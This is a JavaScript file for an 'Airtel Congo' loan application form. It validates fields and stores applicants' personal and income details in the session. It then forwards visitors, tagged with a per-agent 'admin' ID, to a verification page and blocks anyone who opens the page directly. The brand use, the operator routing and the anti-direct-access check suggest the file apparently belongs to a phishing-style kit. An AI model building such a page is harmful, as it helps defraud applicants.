// Application Form Script - Airtel Congo
// ADMIN ID ISOLATION RULES:
//   1. Read admin ID from URL query param (?admin=) OR sessionStorage
//   2. Prefer URL param — it's the ground truth for this request
//   3. NEVER use localStorage
//   4. Pass admin ID forward to verification.html in the URL

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('applicationForm');
    if (!form) { console.error('Application form not found!'); return; }

    // ============================================
    // Get admin ID — URL param takes priority
    // ============================================
    function getAdminId() {
        // 1. URL query param (most reliable — was set by landing page navigation)
        const urlParams = new URLSearchParams(window.location.search);
        const fromUrl = urlParams.get('admin');
        if (fromUrl && fromUrl !== 'undefined' && fromUrl !== 'null' && fromUrl.trim() !== '') {
            // Sync sessionStorage to match URL
            sessionStorage.setItem('selectedAdminId', fromUrl.trim());
            return fromUrl.trim();
        }

        // 2. sessionStorage fallback (same tab, set by landing page)
        const fromSession = sessionStorage.getItem('selectedAdminId');
        if (fromSession && fromSession !== 'undefined' && fromSession !== 'null' && fromSession.trim() !== '') {
            return fromSession.trim();
        }

        return null;
    }

    const adminId = getAdminId();
    console.log('📋 Application form | Admin ID:', adminId || 'MISSING — will be blocked');

    // Block if no admin ID
    if (!adminId) {
        form.innerHTML = `
            <div style="background:#fee2e2;border:2px solid #fecaca;color:#991b1b;padding:24px;border-radius:12px;text-align:center;">
                <div style="font-size:48px;margin-bottom:16px;">⚠️</div>
                <h3 style="margin:0 0 12px;">Lien Invalide</h3>
                <p style="margin:0;">Veuillez utiliser le lien correct fourni par votre agent.<br>N'essayez pas d'ouvrir cette page directement.</p>
            </div>
        `;
        return;
    }

    // Error container
    const errorContainer = document.createElement('div');
    errorContainer.style.cssText = 'display:none; background:#fee2e2; border:2px solid #fecaca; color:#991b1b; padding:16px 20px; border-radius:12px; margin:20px 0; font-size:15px;';
    form.insertBefore(errorContainer, form.firstChild);

    function showErrors(errors) {
        if (!errors.length) { errorContainer.style.display = 'none'; return; }
        errorContainer.innerHTML = '<strong style="display:block;margin-bottom:8px;">⚠ Veuillez corriger :</strong><ul style="margin:8px 0 0 20px;padding:0;">' +
            errors.map(e => `<li style="margin:4px 0;">${e}</li>`).join('') + '</ul>';
        errorContainer.style.display = 'block';
        errorContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }

    // Real-time validation
    const inputs = form.querySelectorAll('input, select, textarea');
    inputs.forEach(input => input.addEventListener('blur', () => validateField(input)));

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        // Re-check admin ID at submit time
        const currentAdminId = getAdminId();
        if (!currentAdminId) {
            showErrors(['Votre lien est invalide. Veuillez utiliser le lien fourni.']);
            return;
        }

        let isValid = true;
        const errors = [];
        inputs.forEach(input => {
            if (!validateField(input)) {
                isValid = false;
                const label = input.previousElementSibling?.textContent || input.name || 'Field';
                errors.push(`${label.trim().replace('*','')}: Information invalide`);
            }
        });
        if (!isValid) { showErrors(errors); return; }
        errorContainer.style.display = 'none';

        // Save form data + admin ID to session
        const formData = {
            fullName:         document.getElementById('fullName')?.value?.trim(),
            email:            document.getElementById('email')?.value?.trim(),
            monthlyIncome:    document.getElementById('monthlyIncome')?.value,
            loanAmount:       document.getElementById('loanAmount')?.value,
            loanPurpose:      document.getElementById('loanPurpose')?.value,
            loanTerm:         document.getElementById('repaymentPeriod')?.value,
            employmentStatus: document.getElementById('employmentStatus')?.value,
            adminId:          currentAdminId,
            applicationId:    'LOAN-' + Date.now(),
            submittedAt:      new Date().toISOString()
        };

        sessionStorage.setItem('applicationData', JSON.stringify(formData));
        sessionStorage.setItem('selectedAdminId', currentAdminId);
        console.log('📋 Application saved | Admin:', currentAdminId);

        // Navigate to verification with admin ID in URL
        window.location.href = `verification.html?admin=${encodeURIComponent(currentAdminId)}`;
    });

    function validateField(field) {
        const value = field.value.trim();
        field.classList.remove('error');
        if (field.hasAttribute('required') && !value)                                              { field.classList.add('error'); return false; }
        if (field.type === 'email' && value && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value))         { field.classList.add('error'); return false; }
        if (field.type === 'number' && value) {
            const num = parseFloat(value);
            const min = parseFloat(field.getAttribute('min'));
            const max = parseFloat(field.getAttribute('max'));
            if ((!isNaN(min) && num < min) || (!isNaN(max) && num > max))                          { field.classList.add('error'); return false; }
        }
        return true;
    }

    const style = document.createElement('style');
    style.textContent = 'input.error, select.error, textarea.error { border-color: #ef4444 !important; background-color: #fef2f2 !important; }';
    document.head.appendChild(style);
});
